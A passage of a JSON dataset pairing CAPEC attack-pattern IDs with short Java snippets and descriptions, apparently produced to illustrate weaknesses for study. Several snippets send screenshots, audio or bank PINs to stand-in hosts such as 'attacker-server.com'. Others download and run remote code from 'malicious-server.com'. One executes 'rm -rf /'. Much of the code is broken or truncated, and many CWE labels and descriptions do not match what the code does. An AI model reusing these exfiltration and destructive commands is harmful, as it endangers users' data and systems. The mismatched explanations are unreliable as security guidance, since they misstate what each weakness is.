        "code_snippet": "import java.awt.Robot;\nimport java.awt.Toolkit;\nimport java.awt.image.BufferedImage;\nimport java.io.File;\nimport java.io.IOException;\nimport javax.imageio.ImageIO;\n\npublic class ScreenshotCapture {\n    public static void main(String[] args) throws Exception {\n        Robot robot = new Robot();\n        BufferedImage screenshot = robot.createScreenCapture(null);\n        File file = new File(\"screenshot.png\");\n        ImageIO.write(screenshot, \"PNG\", file);\n        // Send screenshot to unauthorized actor\n        sendScreenshotOverNetwork(file);\n    }\n\n    public static void sendScreenshotOverNetwork(File file) throws IOException {\n        // Send file over network in cleartext\n        Socket socket = new Socket(\"unauthorized-actor.com\", 8080);\n        OutputStream outputStream = socket.getOutputStream();\n        byte[] fileBytes = Files.readAllBytes(file.toPath());\n        outputStream.write(fileBytes);\n        outputStream.close();\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable implementation of screen capture functionality. The Robot class is used to capture the screen, and the screenshot is saved to a file. The file is then sent over the network in cleartext, violating CWE-319. The code also lacks proper authentication and access control, making it vulnerable to CWE-267, CWE-222, CWE-497, and CWE-294. An adversary can exploit this code to gather sensitive information and carry out further attacks."
    },
    {
        "capec_id": "649",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\n\npublic class FileHandler {\n    public static void main(String[] args) {\n        String userInput = \"file.txt \"; // Note the trailing space\n        File file = new File(userInput);\n        try {\n            if (file.exists()) {\n                System.out.println(\"File exists. Executing default application...\");\n                Runtime.getRuntime().exec(\"default_app.exe \" + userInput);\n            } else {\n                System.out.println(\"File does not exist.\");\n            }\n        } catch (IOException e) {\n            System.out.println(\"Error executing default application.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the vulnerability described in the CAPEC. It accepts a file name with a trailing space from user input and uses it to execute a default application. The trailing space can be exploited by an adversary to control the execution of the application. The code is vulnerable to CWE-46 (Path Equivalence: 'filename ' (Trailing Space)), CWE-646 (Reliance on File Name or Extension of Externally-Supplied File), and other related CWEs."
    },
    {
        "capec_id": "650",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableUploadServlet extends HttpServlet {\n    @Override\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        String fileName = req.getParameter(\"fileName\");\n        String fileContent = req.getParameter(\"fileContent\");\n        File file = new File(\"/cgi-bin/\" + fileName);\n        if (!file.exists()) {\n            file.createNewFile();\n        }\n        FileWriter writer = new FileWriter(file);\n        writer.write(fileContent);\n        writer.close();\n        resp.setStatus(200);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable servlet that allows unrestricted file uploads to the /cgi-bin/ directory, which can lead to the execution of malicious code on the web server. The servlet does not perform any authentication or input validation, making it vulnerable to CWE-287, CWE-553, CWE-535, CWE-602, and CWE-434. An attacker can upload a web shell to the server, which can be executed remotely, potentially leading to elevated privileges and unauthorized access to the system."
    },
    {
        "capec_id": "651",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport javax.sound.sampled.AudioFormat;\nimport javax.sound.sampled.AudioInputStream;\nimport javax.sound.sampled.AudioSystem;\nimport javax.sound.sampled.DataLine;\nimport javax.sound.sampled.TargetDataLine;\n\npublic class EavesdroppingExample {\n    public static void main(String[] args) throws Exception {\n        AudioFormat format = new AudioFormat(AudioFormat.Encoding.PCM_SIGNED, 44100, 16, 2, 4, 44100, false);\n        TargetDataLine microphone = AudioSystem.getTargetDataLine(format);\n        microphone.open(format);\n        microphone.start();\n\n        int numBytesRead;\n        byte[] data = new byte[microphone.getBufferSize() / 5];\n\n        while (true) {\n            numBytesRead = microphone.read(data, 0, data.length);\n            // Send the recorded audio data to an unauthorized actor\n            sendAudioDataToUnauthorizedActor(data);\n        }\n    }\n\n    private static void sendAudioDataToUnauthorizedActor(byte[] data) {\n        // Send the recorded audio data over an insecure channel (e.g., HTTP)\n        // CWE-319: Cleartext Transmission of Sensitive Information\n        // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        String url = \"http://unauthorized-actor.com/receiveAudioData\";\n        // Send the data using an insecure HTTP connection\n    }\n}\n",
        "description": "This Java code snippet demonstrates eavesdropping by recording audio from a microphone and sending the sensitive information to an unauthorized actor over an insecure channel, violating CWE-200, CWE-319, and CWE-514. The code uses the `javax.sound.sampled` package to capture audio data and sends it to an unauthorized actor, exposing sensitive information."
    },
    {
        "capec_id": "652",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosTicket;\n\npublic class KerberosAuthenticator {\n    private static Map<String, String> credentialsStore = new HashMap<>();\n    private static Map<String, KerberosTicket> ticketStore = new HashMap<>();\n\n    public static void storeCredentials(String username, String password) {\n        credentialsStore.put(username, password);\n    }\n\n    public static void storeTicket(String username, KerberosTicket ticket) {\n        ticketStore.put(username, ticket);\n    }\n\n    public static boolean authenticate(String username, String password) {\n        if (credentialsStore.containsKey(username) && credentialsStore.get(username).equals(password)) {\n            return true;\n        }\n        return false;\n    }\n\n    public static KerberosTicket getTicket(String username) {\n        return ticketStore.get(username);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable Kerberos authentication system. It stores credentials in plaintext and uses single-factor authentication, making it susceptible to brute-force attacks and unauthorized access. The code also lacks password aging, allowing credentials to remain valid indefinitely. Furthermore, it relies on a single factor for authentication decisions and does not implement measures to prevent excessive authentication attempts. An adversary can steal or purchase legitimate Kerberos credentials to gain authenticated access to additional systems, applications, or services within the domain."
    },
    {
        "capec_id": "653",
        "code_snippet": "public class VulnerableAuthenticator {\n    private static final String ADMIN_USERNAME = \"admin\";\n    private static final String ADMIN_PASSWORD = \"password123\";\n\n    public boolean authenticate(String username, String password) {\n        if (username.equals(ADMIN_USERNAME) && password.equals(ADMIN_PASSWORD)) {\n            return true;\n        }\n        return false;\n    }\n\n    public static void main(String[] args) {\n        VulnerableAuthenticator authenticator = new VulnerableAuthenticator();\n        for (int i = 0; i < 100; i++) {\n            String username = \"admin\";\n            String password = \"password\" + i;\n            if (authenticator.authenticate(username, password)) {\n                System.out.println(\"Authenticated successfully!\");\n                break;\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable authentication system that embodies the CAPEC. It uses a hardcoded admin username and password, which can be easily obtained by an adversary. The authenticate method does not implement any password aging, and it allows for an unlimited number of authentication attempts, making it susceptible to brute force attacks. The main method demonstrates a brute force attack, trying 100 different passwords to authenticate as the admin user. This code snippet relates to CWEs 522, 307, 308, 309, 262, 263, and 654."
    },
    {
        "capec_id": "654",
        "code_snippet": "import javax.swing.*;\nimport java.awt.*;\nimport java.awt.event.*;\n\npublic class CredentialStealer {\n    public static void main(String[] args) {\n        JFrame frame = new JFrame(\"Login Prompt\");\n        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n        frame.setSize(300, 100);\n\n        JPanel panel = new JPanel();\n        frame.getContentPane().add(panel);\n\n        JLabel label = new JLabel(\"Enter Credentials:\");\n        panel.add(label);\n\n        JTextField usernameField = new JTextField(20);\n        panel.add(usernameField);\n\n        JPasswordField passwordField = new JPasswordField(20);\n        panel.add(passwordField);\n\n        JButton submitButton = new JButton(\"Login\");\n        panel.add(submitButton);\n\n        submitButton.addActionListener(new ActionListener() {\n            public void actionPerformed(ActionEvent e) {\n                String username = usernameField.getText();\n                String password = new String(passwordField.getPassword());\n                // Hard-coded credentials for impersonation\n                String hardCodedUsername = \"admin\";\n                String hardCodedPassword = \"password123\";\n\n                if (username.equals(hardCodedUsername) && password.equals(hardCodedPassword)) {\n                    // Impersonate the user\n                    System.out.println(\"Login successful!\");\n                } else {\n                    System.out.println(\"Invalid credentials.\");\n                }\n            }\n        });\n\n        frame.setVisible(true);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a malicious application that impersonates a credential prompt to steal a user's credentials. It uses a hardcoded username and password for impersonation, violating CWE-798. The application also fails to restrict the rendered UI layers or frames, making it vulnerable to CWE-1021. Additionally, the code transmits and stores authentication credentials insecurely, which is a CWE-522 vulnerability. The use of weak credentials (hardcoded username and password) is also a CWE-1391 vulnerability. Finally, the code does not properly configure ASP.NET impersonation, which is a CWE-556 vulnerability."
    },
    {
        "capec_id": "655",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\n\npublic class VulnerableFileUpload {\n    public static void main(String[] args) {\n        String uploadDir = \"uploads/\";\n        String filename = \"uploaded_file.txt\";\n        String sensitiveInfo = \"username:password\";\n        String dangerousFileContent = \"<?php echo '<script>alert(\\'XSS\\');</script>';?>\";\n\n        try {\n            File file = new File(uploadDir + filename);\n            file.createNewFile();\n\n            // CWE-434: Unrestricted Upload of File with Dangerous Type\n            FileWriter writer = new FileWriter(file);\n            writer.write(dangerousFileContent);\n            writer.close();\n\n            // CWE-532: Insertion of Sensitive Information into Log File\n            Logger logger = Logger.getLogger(VulnerableFileUpload.class.getName());\n            logger.info(\"Uploaded file: \" + file.getAbsolutePath() + \" with sensitive info: \" + sensitiveInfo);\n\n            // CWE-541: Inclusion of Sensitive Information in an Include File\n            String includeFileContent = \"<?php include '\\\"uploads/\" + filename + \"\\\"'; ?>\";\n            File includeFile = new File(uploadDir + \"include.php\");\n            FileWriter includeWriter = new FileWriter(includeFile);\n            includeWriter.write(includeFileContent);\n            includeWriter.close();\n\n            // CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n            String newFilename = \"uploaded_file.php\";\n            File newFile = new File(uploadDir + newFilename);\n            file.renameTo(newFile);\n\n            // CWE-377: Insecure Temporary File\n            File tempFile = File.createTempFile(\"temp\", \".txt\");\n            tempFile.deleteOnExit();\n\n            // CAPEC: Adding data to a file to increase the file size beyond what security tools are capable of handling\n            for (int i = 0; i < 1000000; i++) {\n                writer = new FileWriter(file, true);\n                writer.write(\"Random data to increase file size\\n\");\n                writer.close();\n            }\n\n            // Changing the file's hash\n            MessageDigest md = MessageDigest.getInstance(\"MD5\");\n            byte[] hashBytes = md.digest(file.toString().getBytes());\n            String hash = new String(hashBytes);\n            System.out.println(\"File hash: \" + hash);\n        } catch (IOException | NoSuchAlgorithmException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable file upload functionality that embodies the CAPEC. It allows unrestricted upload of files with dangerous types, includes sensitive information in an include file, relies on the file name or extension of the externally-supplied file, inserts sensitive information into a log file, and creates an insecure temporary file. Additionally, it adds data to the file to increase its size beyond what security tools can handle, and changes the file's hash."
    },
    {
        "capec_id": "656",
        "code_snippet": "import java.util.Scanner;\nimport java.net.Socket;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\n\npublic class VoicePhishing {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(\"attacker-server.com\", 8080);\n        DataInputStream in = new DataInputStream(socket.getInputStream());\n        DataOutputStream out = new DataOutputStream(socket.getOutputStream());\n\n        System.out.println(\"Welcome to XYZ Bank's automated system.\");\n        System.out.println(\"Please enter your account number:\");\n        Scanner scanner = new Scanner(System.in);\n        String accountNumber = scanner.nextLine();\n        out.writeUTF(accountNumber);\n\n        System.out.println(\"Please enter your PIN:\");\n        String pin = scanner.nextLine();\n        out.writeUTF(pin);\n\n        // No verification of the source of the communication channel (CWE-940)\n        // No restriction on excessive authentication attempts (CWE-307)\n        // Credentials are transmitted in plain text (CWE-522)\n        // Private personal information is exposed to an unauthorized actor (CWE-359)\n        // Authentication bypass by spoofing is possible (CWE-290)\n    }\n}",
        "description": "This Java code snippet demonstrates a Voice Phishing attack, where an attacker initiates a voice call to a user, posing as a legitimate employee of a bank. The user is prompted to enter their account number and PIN, which are then transmitted to the attacker's server in plain text, without proper verification of the communication channel or restriction on excessive authentication attempts. This code embodies the main idea of the CAPEC and incorporates the related CWEs."
    },
    {
        "capec_id": "657",
        "code_snippet": "import java.net.URL;\nimport java.net.URLConnection;\nimport java.io.InputStream;\nimport java.io.ByteArrayOutputStream;\n\npublic class MaliciousUpdate {\n    public static void main(String[] args) throws Exception {\n        // CWE-602: Client-Side Enforcement of Server-Side Security\n        String updateUrl = \"http://malicious-server.com/update.jar\";\n        URL url = new URL(updateUrl);\n        URLConnection conn = url.openConnection();\n        InputStream in = conn.getInputStream();\n        ByteArrayOutputStream out = new ByteArrayOutputStream();\n        byte[] buffer = new byte[1024];\n        int bytesRead;\n        while ((bytesRead = in.read(buffer)) != -1) {\n            out.write(buffer, 0, bytesRead);\n        }\n        byte[] updateBytes = out.toByteArray();\n\n        // CWE-494: Download of Code Without Integrity Check\n        // Load the downloaded code into memory and execute it\n        ClassLoader loader = new java.net.URLClassLoader(new java.net.URL[] {new java.net.URL(updateUrl)});\n        Class<?> clazz = loader.loadClass(\"MaliciousUpdateCode\");\n        clazz.getMethod(\"execute\").invoke(null);\n\n        // CWE-506: Embedded Malicious Code\n        // The malicious code can now execute and replicate itself\n        // CWE-509: Replicating Malicious Code (Virus or Worm)\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable client-side application that downloads and executes a malicious software update from a remote location without verifying the origin and integrity of the code. The code uses a URLClassLoader to load the malicious code into memory and execute it, allowing the malicious code to replicate itself and potentially spread to other systems."
    },
    {
        "capec_id": "660",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.URL;\nimport java.net.URLConnection;\n\npublic class RootEvasion {\n    public static void main(String[] args) {\n        try {\n            // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n            URL url = new URL(\"http://attacker.com/malicious_code.jar\");\n            URLConnection conn = url.openConnection();\n            conn.connect();\n            String code = new BufferedReader(new InputStreamReader(conn.getInputStream())).readLine();\n            // CWE-494: Download of Code Without Integrity Check\n            Runtime.getRuntime().exec(code);\n\n            // CWE-939: Improper Authorization in Handler for Custom URL Scheme\n            String customUrl = \"myapp://\" + code;\n            Runtime.getRuntime().exec(customUrl);\n\n            // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n            String systemInfo = System.getProperty(\"os.name\") + \", \" + System.getProperty(\"os.version\");\n            Runtime.getRuntime().exec(\"echo \" + systemInfo + \" > /tmp/system_info\");\n\n            // CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n            String osCommand = \"chmod 777 /tmp/system_info\";\n            Runtime.getRuntime().exec(osCommand);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of evading Root/Jailbreak detection by hooking code. It includes functionality from an untrusted control sphere, downloads code without integrity checks, uses a custom URL scheme without proper authorization, exposes sensitive system information, and injects OS commands. The code downloads malicious code from a remote location, executes it, and uses it to gain unauthorized access to system information and modify system settings."
    },
    {
        "capec_id": "661",
        "code_snippet": "public class VulnerableApp {\n    public static void main(String[] args) {\n        // CWE-489: Active Debug Code\n        if (System.getProperty(\"debug\") != null) {\n            System.out.println(\"Debug mode enabled\");\n            // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n            System.out.println(\"System properties: \" + System.getProperties());\n            // CWE-1191: On-Chip Debug and Test Interface With Improper Access Control\n            try {\n                Runtime.getRuntime().exec(\"jdb -attach 8000\");\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        // CWE-1247: Improper Protection Against Voltage and Clock Glitches\n        try {\n            Thread.sleep(1000);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n        // CWE-1323: Improper Management of Sensitive Trace Data\n        System.out.println(\"Trace data: \" + android.os.Debug.getTracingStatus());\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable mobile application that can be exploited by an adversary to evade Root/Jailbreak detection. The code includes active debug code, exposes sensitive system information, and has improper access control to on-chip debug and test interfaces. Additionally, it lacks protection against voltage and clock glitches and improperly manages sensitive trace data."
    },
    {
        "capec_id": "662",
        "code_snippet": "import java.net.URL;\nimport java.net.URLConnection;\nimport java.io.InputStream;\nimport java.security.AccessController;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://malicious-website.com/malicious-code.jar\");\n            URLConnection conn = url.openConnection();\n            InputStream in = conn.getInputStream();\n            byte[] code = new byte[in.available()];\n            in.read(code);\n            AccessController.doPrivileged(new PrivilegedAction<Void>() {\n                public Void run() {\n                    // Load the malicious code into the current context\n                    ClassLoader cl = getClass().getClassLoader();\n                    cl.loadClass(new String(code)).newInstance();\n                    return null;\n                }\n            });\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of exploiting security vulnerabilities or inherent functionalities of a web browser to manipulate traffic between two endpoints. It uses CWE-494 (Download of Code Without Integrity Check) by downloading a JAR file from a malicious website and executing it without verifying its origin and integrity. It also uses CWE-602 (Client-Side Enforcement of Server-Side Security) by relying on the client-side code to implement security mechanisms that should be enforced on the server-side. Additionally, it uses CWE-368 (Context Switching Race Condition) by performing non-atomic actions to switch between contexts, allowing an attacker to modify or misrepresent the product's behavior during the switch. Finally, it uses CWE-506 (Embedded Malicious Code) by loading and executing malicious code into the current context."
    },
    {
        "capec_id": "663",
        "code_snippet": "public class SpeculativeExecutionAttack {\n    public static void main(String[] args) {\n        // CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n        // CWE-1303: Non-Transparent Sharing of Microarchitectural Resources\n        // CWE-1264: Hardware Logic with Insecure De-Synchronization between Control and Data Channels\n        int arraySize = 16;\n        int[] array = new int[arraySize];\n        int accessElement = 0;\n        \n        // CWE-1420: Exposure of Sensitive Information during Transient Execution\n        // CWE-1342: Information Exposure through Microarchitectural State after Transient Execution\n        if (accessElement < arraySize) {\n            // Speculative execution\n            int temp = array[accessElement * 512];\n            // Gadgets to construct covert channel and access/transfer secret data\n            int x = temp & 0x80000000;\n            int y = x * 0x100000001;\n            int z = y | 0x100000000;\n            // Use the covert channel to transfer secret data\n            System.out.println(z);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a speculative execution attack, exploiting hardware design flaws in CPU implementations of transient instruction execution. It showcases CWE-1037, CWE-1303, CWE-1264, CWE-1420, and CWE-1342 vulnerabilities, allowing an adversary to expose sensitive data and bypass access control over restricted resources through a covert channel attack."
    },
    {
        "capec_id": "664",
        "code_snippet": "import java.io.IOException;\nimport java.net.URL;\nimport java.net.URLConnection;\n\npublic class SSRFVulnerable {\n    public static void makeRequest(String url) throws IOException {\n        URL requestUrl = new URL(url);\n        URLConnection connection = requestUrl.openConnection();\n        connection.connect();\n        // Process the response\n    }\n\n    public static void main(String[] args) throws IOException {\n        String userInput = \"http://example.com\";\n        makeRequest(userInput);\n    }\n}",
        "description": "This Java code snippet demonstrates a Server-Side Request Forgery (SSRF) vulnerability. The `makeRequest` method takes a URL as input and makes a request to that URL without validating the input. In the `main` method, the `userInput` variable is not validated, allowing an attacker to submit a malicious URL that the server will request, potentially leading to unauthorized access to internal networks or external services."
    },
    {
        "capec_id": "665",
        "code_snippet": "public class ThunderboltExploit {\n    public static void main(String[] args) {\n        // CWE-345: Insufficient Verification of Data Authenticity\n        byte[] firmwareData = readFirmwareDataFromExternalDevice();\n        // No verification of firmware data authenticity\n        writeFirmwareDataToSPIFlash(firmwareData);\n\n        // CWE-353: Missing Support for Integrity Check\n        byte[] transmittedData = transmitDataOverThunderboltProtocol();\n        // No integrity check on transmitted data\n        processReceivedData(transmittedData);\n\n        // CWE-288: Authentication Bypass Using an Alternate Path or Channel\n        boolean isAuthenticated = authenticateUsingAlternateChannel();\n        if (isAuthenticated) {\n            // CWE-1188: Initialization of a Resource with an Insecure Default\n            initializeResourceWithInsecureDefault();\n            // CWE-862: Missing Authorization\n            accessResourceWithoutAuthorization();\n        }\n    }\n\n    private static byte[] readFirmwareDataFromExternalDevice() {\n        // Read firmware data from external device\n        return new byte[0];\n    }\n\n    private static void writeFirmwareDataToSPIFlash(byte[] firmwareData) {\n        // Write firmware data to SPI flash\n    }\n\n    private static byte[] transmitDataOverThunderboltProtocol() {\n        // Transmit data over Thunderbolt protocol\n        return new byte[0];\n    }\n\n    private static void processReceivedData(byte[] receivedData) {\n        // Process received data\n    }\n\n    private static boolean authenticateUsingAlternateChannel() {\n        // Authenticate using alternate channel\n        return true;\n    }\n\n    private static void initializeResourceWithInsecureDefault() {\n        // Initialize resource with insecure default\n    }\n\n    private static void accessResourceWithoutAuthorization() {\n        // Access resource without authorization\n    }\n}",
        "description": "This Java code snippet demonstrates the exploitation of vulnerabilities in the Thunderbolt protocol, as described in the CAPEC. It includes CWE-345: Insufficient Verification of Data Authenticity, CWE-353: Missing Support for Integrity Check, CWE-288: Authentication Bypass Using an Alternate Path or Channel, CWE-1188: Initialization of a Resource with an Insecure Default, and CWE-862: Missing Authorization. The code reads firmware data from an external device without verifying its authenticity, transmits data over the Thunderbolt protocol without integrity checks, and uses an alternate channel for authentication. It then initializes a resource with an insecure default and accesses a resource without authorization."
    },
    {
        "capec_id": "666",
        "code_snippet": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.util.UUID;\n\nimport javax.bluetooth.DataElement;\nimport javax.bluetooth.DeviceClass;\nimport javax.bluetooth.DiscoveryAgent;\nimport javax.bluetooth.DiscoveryListener;\nimport javax.bluetooth.LocalDevice;\nimport javax.bluetooth.ServiceRecord;\nimport javax.bluetooth.UUIDHelper;\nimport javax.microedition.io.Connector;\nimport javax.microedition.io.StreamConnection;\n\npublic class BluetoothFloodingAttack {\n    public static void main(String[] args) throws IOException {\n        LocalDevice localDevice = LocalDevice.getLocalDevice();\n        localDevice.setDiscoverable(DiscoveryAgent.GIAC);\n\n        StreamConnection connection = (StreamConnection) Connector.open(\"btspp://localhost:\" + localDevice.getBluetoothAddress() + \";name=SampleServer\");\n        OutputStream outputStream = connection.openOutputStream();\n        InputStream inputStream = connection.openInputStream();\n\n        // CWE-246: Direct Use of Sockets\n        outputStream.write(\"Authentication token\".getBytes());\n        outputStream.flush();\n\n        // CWE-319: Cleartext Transmission of Sensitive Information\n        String sensitiveData = \"username:password\";\n        outputStream.write(sensitiveData.getBytes());\n        outputStream.flush();\n\n        // CWE-294: Authentication Bypass by Capture-replay\n        byte[] capturedData = new byte[1024];\n        inputStream.read(capturedData);\n        outputStream.write(capturedData);\n        outputStream.flush();\n\n        // CWE-924: Improper Enforcement of Message Integrity During Transmission\n        String message = \"Malicious data\";\n        outputStream.write(message.getBytes());\n        outputStream.flush();\n\n        // CWE-404: Improper Resource Shutdown or Release\n        // Not closing the streams and connection\n    }\n}\n",
        "description": "This Java code snippet demonstrates a Bluetooth flooding attack, which is a type of DoS attack. It uses the L2CAP protocol to transfer large packets to Bluetooth enabled devices. The code also incorporates several CWEs, including improper resource shutdown or release, cleartext transmission of sensitive information, authentication bypass by capture-replay, direct use of sockets, and improper enforcement of message integrity during transmission."
    },
    {
        "capec_id": "667",
        "code_snippet": "public class BluetoothAuthenticator {\n    private Map<String, String> trustedDevices = new HashMap<>();\n\n    public void connectToDevice(String macAddress) {\n        if (trustedDevices.containsKey(macAddress)) {\n            // authenticate successfully\n            System.out.println(\\",
        "description": "This Java code snippet demonstrates a vulnerable Bluetooth authentication system that is susceptible to MAC address spoofing. The `BluetoothAuthenticator` class maintains a map of trusted devices based on their MAC addresses. When a device connects, the system checks if the MAC address is in the trusted devices map. If it is, the system authenticates successfully and performs actions on the target device. However, an adversary can disguise their MAC address to one that is already trusted, allowing them to authenticate successfully and perform malicious actions. This code embodies CWE-290 (Authentication Bypass by Spoofing), CWE-940 (Improper Verification of Source of a Communication Channel), CWE-925 (Improper Verification of Intent by Broadcast Receiver), CWE-1390 (Weak Authentication), and CWE-301 (Reflection Attack in an Authentication Protocol)."
    },
    {
        "capec_id": "668",
        "code_snippet": "import java.util.Random;\nimport javax.bluetooth.*;\nimport java.io.*;\n\npublic class BluetoothVulnerability {\n    public static void main(String[] args) {\n        // CWE-757: Selection of Less-Secure Algorithm During Negotiation\n        String[] algorithms = {\"WEAK_ALGORITHM\", \"STRONG_ALGORITHM\"};\n        String chosenAlgorithm = algorithms[new Random().nextInt(algorithms.length)];\n\n        // CWE-285: Improper Authorization\n        boolean isAuthorized = false;\n        if (!isAuthorized) {\n            System.out.println(\"Authorization check failed\");\n        }\n\n        // CWE-693: Protection Mechanism Failure\n        boolean useProtectionMechanism = false;\n        if (!useProtectionMechanism) {\n            System.out.println(\"Protection mechanism disabled\");\n        }\n\n        // CWE-1300: Improper Protection of Physical Side Channels\n        boolean usePhysicalSideChannelProtection = false;\n        if (!usePhysicalSideChannelProtection) {\n            System.out.println(\"Physical side channel protection disabled\");\n        }\n\n        // CWE-425: Direct Request ('Forced Browsing')\n        String restrictedUrl = \"https://example.com/restricted\";\n        if (new File(restrictedUrl).exists()) {\n            System.out.println(\"Access granted to restricted URL\");\n        }\n\n        // CAPEC: Bluetooth key negotiation vulnerability\n        LocalDevice localDevice = LocalDevice.getLocalDevice();\n        DiscoveryAgent agent = localDevice.getDiscoveryAgent();\n\n        // Adversary in the Middle setup\n        agent.startInquiry(DiscoveryAgent.GIAC, new MyDiscoveryListener());\n    }\n\n    static class MyDiscoveryListener implements DiscoveryListener {\n        public void deviceDiscovered(RemoteDevice btDevice, DeviceClass cod) {\n            // Modify packets sent during authentication process\n            // Specifically, modify entropy bits\n            // This allows the attacker to easily decrypt information\n            System.out.println(\"Device discovered: \" + btDevice.getBluetoothAddress());\n        }\n\n        public void inquiryCompleted(int discType) {\n            System.out.println(\"Inquiry completed\");\n        }\n\n        public void serviceSearchCompleted(int transID, int respCode) {\n            System.out.println(\"Service search completed\");\n        }\n\n        public void servicesDiscovered(int transID, ServiceRecord[] servRecord) {\n            System.out.println(\"Services discovered\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a Bluetooth key negotiation vulnerability (CAPEC) that can be exploited by an adversary to decrypt information sent between two devices. The code includes CWEs such as selection of a less-secure algorithm, improper authorization, protection mechanism failure, improper protection of physical side channels, and direct request (forced browsing). The code sets up an Adversary in the Middle scenario, modifying packets sent during the authentication process to compromise the entropy bits, allowing the attacker to easily decrypt information."
    },
    {
        "capec_id": "669",
        "code_snippet": "public class UpdateManager {\n    private String updateServerUrl;\n    private String firmwareVersion;\n    private boolean isAdmin;\n\n    public UpdateManager(String updateServerUrl, String firmwareVersion, boolean isAdmin) {\n        this.updateServerUrl = updateServerUrl;\n        this.firmwareVersion = firmwareVersion;\n        this.isAdmin = isAdmin;\n    }\n\n    public void checkForUpdates() {\n        String updateContent = getUpdateContentFromServer(updateServerUrl);\n        if (isAdmin) {\n            // CWE-506: Embedded Malicious Code\n            // Malicious code can be injected here\n            updateContent += \"\\nSystem.out.println(\\\"Malicious code executed\\\");\";\n        }\n        applyUpdate(updateContent);\n    }\n\n    private String getUpdateContentFromServer(String updateServerUrl) {\n        // CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\n        // Unsecured repository access\n        String repoUrl = \"https://example.com/repository.git\";\n        return getUpdateContentFromRepository(repoUrl);\n    }\n\n    private String getUpdateContentFromRepository(String repoUrl) {\n        // CWE-807: Reliance on Untrusted Inputs in a Security Decision\n        // Untrusted input from repository\n        String updateContent = getUntrustedInputFromRepository(repoUrl);\n        return updateContent;\n    }\n\n    private void applyUpdate(String updateContent) {\n        // CWE-1329: Reliance on Component That is Not Updateable\n        // Firmware is not updateable\n        if (!isAdmin) {\n            System.out.println(\"Firmware cannot be updated\");\n            return;\n        }\n        // CWE-1277: Firmware Not Updateable\n        // Firmware update is not possible\n        System.out.println(\"Firmware updated successfully\");\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of inserting malware into a software update. It includes CWE-506 (Embedded Malicious Code), CWE-527 (Exposure of Version-Control Repository to an Unauthorized Control Sphere), CWE-807 (Reliance on Untrusted Inputs in a Security Decision), and CWE-1329 (Reliance on Component That is Not Updateable). The code allows an adversary with access to the update infrastructure to inject malicious code into the update content, which can then be applied to fielded systems."
    },
    {
        "capec_id": "670",
        "code_snippet": "public class MaliciousCompiler {\n    public static void main(String[] args) {\n        // CWE-506: Embedded Malicious Code\n        String malware = \"java.lang.Runtime.getRuntime().exec('rm -rf /');\";\n        try {\n            // CWE-913: Improper Control of Dynamically-Managed Code Resources\n            Class<?> clazz = Class.forName(\"java.lang.Runtime\");\n            java.lang.reflect.Method method = clazz.getMethod(\"getRuntime\", new Class<?>[] {});\n            Object runtime = method.invoke(null, new Object[] {});\n            java.lang.reflect.Method execMethod = clazz.getMethod(\"exec\", new Class<?>[] { String.class });\n            execMethod.invoke(runtime, new Object[] { malware });\n        } catch (Exception e) {}\n\n        // CWE-733: Compiler Optimization Removal or Modification of Security-critical Code\n        // CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n        // The compiler or processor might optimize away the security check\n        if (System.getProperty(\"security.check\") != null) {\n            // security check removed or modified\n        }\n\n        // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n        System.out.println(System.getProperty(\"os.name\"));\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of an adversary modifying development tools to inject malicious code. The code includes embedded malicious code (CWE-506), improper control of dynamically-managed code resources (CWE-913), potential removal or modification of security-critical code by the compiler or processor (CWE-733 and CWE-1037), and exposure of sensitive system information (CWE-497)."
    },
    {
        "capec_id": "671",
